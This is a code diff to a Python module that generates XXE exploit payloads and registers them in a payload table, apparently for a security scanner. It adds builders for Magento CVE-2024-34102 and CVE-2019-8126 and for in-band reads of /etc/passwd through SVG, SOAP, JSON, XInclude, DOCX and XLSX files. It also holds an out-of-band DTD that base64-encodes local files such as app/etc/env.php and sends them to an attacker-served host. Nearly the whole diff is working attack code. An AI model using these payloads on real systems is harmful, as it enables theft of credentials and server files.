@@ -36,12 +36,39 @@ def _esc(text: str) -> str:
                 .replace(">", "&gt;").replace('"', "&quot;"))
 
 
+def _strip_target_scheme(target: str) -> str:
+    """Reduce a possibly-wrapped target to a bare path.
+
+    Strips php filter wrappers and scheme prefixes (iteratively) so callers can
+    re-apply the correct wrapper without producing ``file://file://...`` or
+    ``php://filter/.../resource=php://...`` chains.  A bare relative path such as
+    ``app/etc/env.php`` is returned unchanged.
+    """
+    t = (target or "").strip()
+    prefixes = (
+        "php://filter/read=convert.base64-encode/resource=",
+        "resource=",
+        "resource:",
+        "file://",
+        "php://",
+    )
+    changed = True
+    while changed and t:
+        changed = False
+        for p in prefixes:
+            if t.startswith(p):
+                t = t[len(p):]
+                changed = True
+                break
+    return t
+
+
 def _param_entity_http_exfil(cid: str, oob_base: str, target: str) -> str:
     """DTD content served by the attacker: OOB file exfil via php filter base64."""
     host = _esc(oob_base.rstrip("/"))
-    fname = _esc(target.replace("'", "&apos;"))
+    path = _esc(_strip_target_scheme(target)).replace("'", "&apos;")
     return (
-        f'<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource={fname}">\n'
+        f'<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource={path}">\n'
         f'<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'{host}/x/{cid}?d=%file;\'>">\n'
         f'%eval;\n%exfil;\n'
     )
@@ -50,8 +77,9 @@ def _param_entity_http_exfil(cid: str, oob_base: str, target: str) -> str:
 def _dtd_generic(cid: str, oob_base: str, target: str) -> str:
     """Fallback DTD (non-php targets) - path fallback to /etc/passwd handled by caller."""
     host = _esc(oob_base.rstrip("/"))
+    path = _esc(_strip_target_scheme(target))
     return (
-        f'<!ENTITY % file SYSTEM "file://{_esc(target)}">\n'
+        f'<!ENTITY % file SYSTEM "file://{path}">\n'
         f'<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'{host}/x/{cid}?d=%file;\'>">\n'
         f'%eval;\n%exfil;\n'
     )
@@ -109,9 +137,9 @@ def build_oob_file_exfil(ctx: Dict) -> str:
 def build_error_based(ctx: Dict) -> str:
     """Error-based XXE: force parser error that includes file content."""
     cid = ctx.get("cid", "x")
-    target = ctx.get("target", "file:///etc/hostname")
+    path = _esc(_strip_target_scheme(ctx.get("target", "file:///etc/hostname")))
     return (
-        f"{_XML_DECL}\n<!DOCTYPE r [<!ENTITY % file SYSTEM \"{target}\">"
+        f"{_XML_DECL}\n<!DOCTYPE r [<!ENTITY % file SYSTEM \"file://{path}\">"
         f"<!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">"
         f"%eval;]>\n<r>SOFIA[{cid}]</r>"
     )
@@ -131,12 +159,12 @@ def build_xinclude(ctx: Dict) -> str:
 def build_xslt(ctx: Dict) -> str:
     """XSLT payload - document() to read local files, rendered via output."""
     cid = ctx.get("cid", "x")
-    target = ctx.get("target", "file:///etc/hostname")
+    path = _esc(_strip_target_scheme(ctx.get("target", "file:///etc/hostname")))
     return (
         f"{_XML_DECL}\n<?xml-stylesheet type=\"text/xsl\" href=\"#s\"?>"
         f"<r>SOFIA[{cid}]</r>\n<xsl:stylesheet id=\"s\" version=\"1.0\" "
         f"xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">"
-        f"<xsl:template match=\"/\"><xsl:copy-of select=\"document('{target}')\"/>"
+        f"<xsl:template match=\"/\"><xsl:copy-of select=\"document('file://{path}')\"/>"
         f"</xsl:template></xsl:stylesheet>"
     )
 
@@ -204,18 +232,173 @@ def build_rss_entity(ctx: Dict) -> str:
     )
 
 
-def build_docx_upload(ctx: Dict) -> bytes:
-    """Minimal OOXML (.docx) zip containing a XXE-carrying document.xml."""
+def build_cosmicsting_svg(ctx: Dict) -> str:
+    """Magento CosmicSting (CVE-2024-34102) SVG part for multipart uploads.
+
+    Delivered as an ``image/svg+xml`` file part (e.g. to /graphql, /rest/V1 or
+    /import endpoints); a hit on the OOB probe URL proves the uploaded SVG was
+    parsed with external entities enabled.
+    """
     cid = ctx.get("cid", "x")
     oob = ctx.get("oob_base", "http://127.0.0.1:17888")
     url = f"{oob.rstrip('/')}/probe/{cid}"
-    document_xml = (
-        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
-        '<!DOCTYPE w:document [<!ENTITY xxe SYSTEM "'
-        + url + '">]>'
-        '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
-        '<w:body><w:p><w:r><w:t>&xxe;SOFIA[' + cid + ']</w:t></w:r></w:p></w:body></w:document>'
+    return (
+        f"{_XML_DECL}\n<!DOCTYPE svg [<!ENTITY xxe SYSTEM \"{url}\">]>"
+        f"<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"100\" height=\"100\">"
+        f"<text x=\"10\" y=\"20\">&xxe;SOFIA[{cid}]</text></svg>"
     )
+
+
+def build_xml_layout_xxe(ctx: Dict) -> str:
+    """Magento XML layout XXE (CVE-2019-8126) template.
+
+    Magento parses layout XML (admin "XML Layout" customizations / import); a
+    probe hit proves the parser followed the external entity.
+    """
+    cid = ctx.get("cid", "x")
+    oob = ctx.get("oob_base", "http://127.0.0.1:17888")
+    url = f"{oob.rstrip('/')}/probe/{cid}"
+    return (
+        f"{_XML_DECL}\n<!DOCTYPE layout [<!ENTITY xxe SYSTEM \"{url}\">]>"
+        f"<layout>&xxe;SOFIA[{cid}]</layout>"
+    )
+
+
+def _file_uri(target: str) -> str:
+    """Normalize a target into a ``file://`` URI for in-band entity reads."""
+    t = _strip_target_scheme(target or "").strip()
+    if not t:
+        return "file:///etc/passwd"
+    return f"file://{t}"
+
+
+def build_file_read_inband(ctx: Dict) -> str:
+    """External general entity -> local file, content rendered in the response."""
+    cid = ctx.get("cid", "x")
+    path = _esc(_file_uri(ctx.get("target", "file:///etc/passwd")))
+    return (
+        f"{_XML_DECL}\n<!DOCTYPE r [<!ENTITY xxe SYSTEM \"{path}\">]>"
+        f"<r>&xxe;SOFIA[{cid}]</r>"
+    )
+
+
+def build_param_entity_file_read(ctx: Dict) -> str:
+    """Parameter entity reads a file and feeds it into a general entity.
+
+    Bypasses parsers that block general external entities but still resolve
+    parameter entities; the file content is rendered inside <r>.
+    """
+    cid = ctx.get("cid", "x")
+    path = _esc(_file_uri(ctx.get("target", "file:///etc/passwd")))
+    return (
+        f"{_XML_DECL}\n<!DOCTYPE r ["
+        f"<!ENTITY % file SYSTEM \"{path}\">"
+        f"<!ENTITY % eval \"<!ENTITY &#x25; exfil '&#x25;file;'>\">"
+        f"%eval;]>\n<r>&exfil;SOFIA[{cid}]</r>"
+    )
+
+
+def build_oob_general_entity_dtd(ctx: Dict) -> str:
+    """General external entity pointing at the attacker DTD.
+
+    Unlike the parameter-entity variant this works even when parameter
+    entities are blocked; the DTD content is inlined in the response and the
+    fetch itself registers an OOB callback.
+    """
+    cid = ctx.get("cid", "x")
+    dtd = ctx.get("dtd_url", "")
+    if not dtd:
+        dtd = f"{ctx.get('oob_base', 'http://127.0.0.1:17888')}/dtd/{cid}.dtd"
+    return (
+        f"{_XML_DECL}\n<!DOCTYPE r [<!ENTITY xxe SYSTEM \"{dtd}\">]>"
+        f"<r>&xxe;SOFIA[{cid}]</r>"
+    )
+
+
+def build_oob_probe_https(ctx: Dict) -> str:
+    """External entity via the HTTPS scheme.
+
+    Matches egress filters / parsers that only follow https URLs.  Only
+    produces a callback when the OOB base is reachable over TLS (e.g. the
+    Cloudflare tunnel URL, which is https:// on the wire).
+    """
+    cid = ctx.get("cid", "x")
+    oob = ctx.get("oob_base", "http://127.0.0.1:17888")
+    url = f"{oob.rstrip('/')}/probe/{cid}"
+    if url.startswith("http://"):
+        url = "https://" + url[len("http://"):]
+    return (
+        f"{_XML_DECL}\n<!DOCTYPE r [<!ENTITY xxe SYSTEM \"{url}\">]>"
+        f"<r>&xxe;</r>"
+    )
+
+
+def build_xinclude_file(ctx: Dict) -> str:
+    """XInclude pulling a local file as text."""
+    cid = ctx.get("cid", "x")
+    path = _esc(_file_uri(ctx.get("target", "file:///etc/passwd")))
+    return (
+        f"{_XML_DECL}\n<r xmlns:xi=\"http://www.w3.org/2001/XInclude\">"
+        f"<xi:include parse=\"text\" href=\"{path}\"/>SOFIA[{cid}]</r>"
+    )
+
+
+def build_xslt_oob(ctx: Dict) -> str:
+    """XSLT stylesheet whose document() fetches the OOB probe URL."""
+    cid = ctx.get("cid", "x")
+    oob = ctx.get("oob_base", "http://127.0.0.1:17888")
+    url = _esc(f"{oob.rstrip('/')}/probe/{cid}")
+    return (
+        f"{_XML_DECL}\n<?xml-stylesheet type=\"text/xsl\" href=\"#s\"?>"
+        f"<r>SOFIA[{cid}]</r>\n<xsl:stylesheet id=\"s\" version=\"1.0\" "
+        f"xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">"
+        f"<xsl:template match=\"/\"><xsl:copy-of select=\"document('{url}')\"/>"
+        f"</xsl:template></xsl:stylesheet>"
+    )
+
+
+def build_svg_file_read(ctx: Dict) -> str:
+    """SVG with an external entity reading a local file (in-band)."""
+    cid = ctx.get("cid", "x")
+    path = _esc(_file_uri(ctx.get("target", "file:///etc/passwd")))
+    return (
+        f"{_XML_DECL}\n<!DOCTYPE svg [<!ENTITY xxe SYSTEM \"{path}\">]>"
+        f"<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"100\" height=\"100\">"
+        f"<text x=\"10\" y=\"20\">&xxe;SOFIA[{cid}]</text></svg>"
+    )
+
+
+def build_soap_file_read(ctx: Dict) -> str:
+    """SOAP envelope whose entity reads a local file (in-band)."""
+    cid = ctx.get("cid", "x")
+    path = _esc(_file_uri(ctx.get("target", "file:///etc/passwd")))
+    return (
+        f"{_XML_DECL}\n<!DOCTYPE Envelope [<!ENTITY xxe SYSTEM \"{path}\">]>"
+        f"<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">"
+        f"<soapenv:Body><req>&xxe;SOFIA[{cid}]</req></soapenv:Body></soapenv:Envelope>"
+    )
+
+
+def build_json_xml_chain_file(ctx: Dict) -> str:
+    """JSON payload carrying in-band file-read XML (JSON->XML converters)."""
+    cid = ctx.get("cid", "x")
+    path = _esc(_file_uri(ctx.get("target", "file:///etc/passwd")))
+    xml = (
+        f'<!DOCTYPE r [<!ENTITY xxe SYSTEM "{path}">]><r>&xxe;SOFIA[{cid}]</r>'
+    )
+    return f'{{"data": "{xml}", "cid": "{cid}"}}'
+
+
+def _zip_ooxml(parts: Dict[str, str]) -> bytes:
+    """Zip named XML parts into an OOXML package."""
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
+        for name, content in parts.items():
+            z.writestr(name, content)
+    return buf.getvalue()
+
+
+def _docx_parts(document_xml: str) -> Dict[str, str]:
     content_types = (
         '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
         '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
@@ -232,12 +415,97 @@ def build_docx_upload(ctx: Dict) -> bytes:
         'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" '
         'Target="word/document.xml"/></Relationships>'
     )
-    buf = io.BytesIO()
-    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
-        z.writestr("[Content_Types].xml", content_types)
-        z.writestr("_rels/.rels", rels)
-        z.writestr("word/document.xml", document_xml)
-    return buf.getvalue()
+    return {
+        "[Content_Types].xml": content_types,
+        "_rels/.rels": rels,
+        "word/document.xml": document_xml,
+    }
+
+
+def build_docx_upload(ctx: Dict) -> bytes:
+    """Minimal OOXML (.docx) zip containing a XXE-carrying document.xml."""
+    cid = ctx.get("cid", "x")
+    oob = ctx.get("oob_base", "http://127.0.0.1:17888")
+    url = f"{oob.rstrip('/')}/probe/{cid}"
+    document_xml = (
+        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
+        '<!DOCTYPE w:document [<!ENTITY xxe SYSTEM "'
+        + url + '">]>'
+        '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
+        '<w:body><w:p><w:r><w:t>&xxe;SOFIA[' + cid + ']</w:t></w:r></w:p></w:body></w:document>'
+    )
+    return _zip_ooxml(_docx_parts(document_xml))
+
+
+def build_docx_file_read(ctx: Dict) -> bytes:
+    """OOXML .docx whose document.xml reads a local file (in-band)."""
+    cid = ctx.get("cid", "x")
+    path = _esc(_file_uri(ctx.get("target", "file:///etc/passwd")))
+    document_xml = (
+        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
+        '<!DOCTYPE w:document [<!ENTITY xxe SYSTEM "'
+        + path + '">]>'
+        '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
+        '<w:body><w:p><w:r><w:t>&xxe;SOFIA[' + cid + ']</w:t></w:r></w:p></w:body></w:document>'
+    )
+    return _zip_ooxml(_docx_parts(document_xml))
+
+
+def build_xlsx_upload(ctx: Dict) -> bytes:
+    """Minimal OOXML (.xlsx) zip carrying an XXE probe in sheet1.xml.
+
+    Spreadsheet import/convert endpoints often reuse a different parser path
+    than plain XML uploads, so the .xlsx package is worth probing separately.
+    """
+    cid = ctx.get("cid", "x")
+    oob = ctx.get("oob_base", "http://127.0.0.1:17888")
+    url = f"{oob.rstrip('/')}/probe/{cid}"
+    sheet = (
+        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
+        '<!DOCTYPE worksheet [<!ENTITY xxe SYSTEM "'
+        + url + '">]>'
+        '<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
+        '<sheetData><row r="1"><c r="A1"><v>&xxe;SOFIA[' + cid + ']</v></c></row>'
+        '</sheetData></worksheet>'
+    )
+    content_types = (
+        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
+        '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
+        '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
+        '<Default Extension="xml" ContentType="application/xml"/>'
+        '<Override PartName="/xl/workbook.xml" '
+        'ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>'
+        '<Override PartName="/xl/worksheets/sheet1.xml" '
+        'ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>'
+        '</Types>'
+    )
+    root_rels = (
+        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
+        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
+        '<Relationship Id="rId1" '
+        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" '
+        'Target="xl/workbook.xml"/></Relationships>'
+    )
+    workbook = (
+        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
+        '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" '
+        'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
+        '<sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets></workbook>'
+    )
+    workbook_rels = (
+        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
+        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
+        '<Relationship Id="rId1" '
+        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" '
+        'Target="worksheets/sheet1.xml"/></Relationships>'
+    )
+    return _zip_ooxml({
+        "[Content_Types].xml": content_types,
+        "_rels/.rels": root_rels,
+        "xl/workbook.xml": workbook,
+        "xl/_rels/workbook.xml.rels": workbook_rels,
+        "xl/worksheets/sheet1.xml": sheet,
+    })
 
 
 def build_baseline_xml(ctx: Dict) -> str:
@@ -393,6 +661,132 @@ PAYLOAD_REGISTRY: Dict[str, Dict] = {
         "capability": "external_entity",
         "requires_oob": True,
     },
+    "cosmicsting_svg": {
+        "label": "Magento CosmicSting SVG (CVE-2024-34102)",
+        "content_type": "image/svg+xml",
+        "builder": build_cosmicsting_svg,
+        "binary": False,
+        "purpose": "capability",
+        "capability": "external_entity",
+        "requires_oob": True,
+        "cve_id": "CVE-2024-34102",
+    },
+    "xml_layout_xxe": {
+        "label": "Magento XML layout XXE (CVE-2019-8126)",
+        "content_type": "application/xml",
+        "builder": build_xml_layout_xxe,
+        "binary": False,
+        "purpose": "capability",
+        "capability": "external_entity",
+        "requires_oob": True,
+        "cve_id": "CVE-2019-8126",
+    },
+    "file_read_inband": {
+        "label": "In-band file read (general entity)",
+        "content_type": "application/xml",
+        "builder": build_file_read_inband,
+        "binary": False,
+        "purpose": "exfil",
+        "capability": "external_entity",
+        "file_read": True,
+        "requires_exfil": True,
+    },
+    "param_entity_file_read": {
+        "label": "Parameter-entity in-band file read",
+        "content_type": "application/xml",
+        "builder": build_param_entity_file_read,
+        "binary": False,
+        "purpose": "exfil",
+        "capability": "external_entity",
+        "file_read": True,
+        "requires_exfil": True,
+    },
+    "oob_general_entity_dtd": {
+        "label": "OOB general entity -> attacker DTD",
+        "content_type": "application/xml",
+        "builder": build_oob_general_entity_dtd,
+        "binary": False,
+        "purpose": "capability",
+        "capability": "external_entity",
+        "requires_oob": True,
+    },
+    "oob_probe_https": {
+        "label": "OOB HTTPS external entity probe",
+        "content_type": "application/xml",
+        "builder": build_oob_probe_https,
+        "binary": False,
+        "purpose": "capability",
+        "capability": "external_entity",
+        "requires_oob": True,
+    },
+    "xinclude_file": {
+        "label": "XInclude file read",
+        "content_type": "application/xml",
+        "builder": build_xinclude_file,
+        "binary": False,
+        "purpose": "exfil",
+        "capability": "xinclude",
+        "file_read": True,
+        "requires_exfil": True,
+    },
+    "xslt_oob": {
+        "label": "XSLT document() OOB probe",
+        "content_type": "application/xml",
+        "builder": build_xslt_oob,
+        "binary": False,
+        "purpose": "capability",
+        "capability": "xslt",
+        "requires_oob": True,
+    },
+    "svg_file_read": {
+        "label": "SVG in-band file read",
+        "content_type": "image/svg+xml",
+        "builder": build_svg_file_read,
+        "binary": False,
+        "purpose": "exfil",
+        "capability": "external_entity",
+        "file_read": True,
+        "requires_exfil": True,
+    },
+    "soap_file_read": {
+        "label": "SOAP in-band file read",
+        "content_type": "text/xml",
+        "builder": build_soap_file_read,
+        "binary": False,
+        "purpose": "exfil",
+        "capability": "external_entity",
+        "file_read": True,
+        "requires_exfil": True,
+    },
+    "json_xml_chain_file": {
+        "label": "JSON->XML in-band file read",
+        "content_type": "application/json",
+        "builder": build_json_xml_chain_file,
+        "binary": False,
+        "purpose": "exfil",
+        "capability": "external_entity",
+        "file_read": True,
+        "requires_exfil": True,
+    },
+    "docx_file_read": {
+        "label": "OOXML .docx in-band file read",
+        "content_type": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
+        "builder": build_docx_file_read,
+        "binary": True,
+        "purpose": "exfil",
+        "capability": "external_entity",
+        "file_read": True,
+        "requires_exfil": True,
+    },
+    "xlsx_upload": {
+        "label": "OOXML .xlsx with XXE",
+        "content_type": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
+        "builder": build_xlsx_upload,
+        "binary": True,
+        "purpose": "capability",
+        "capability": "external_entity",
+        "requires_oob": True,
+    },
 }
 
 
@@ -430,5 +824,10 @@ def dtd_payload(cid: str, oob_base: str, target: str, php: bool = True) -> str:
 
 def payload_kinds() -> List[str]:
     return list(PAYLOAD_REGISTRY.keys())
+
+
+
+
+
 
 
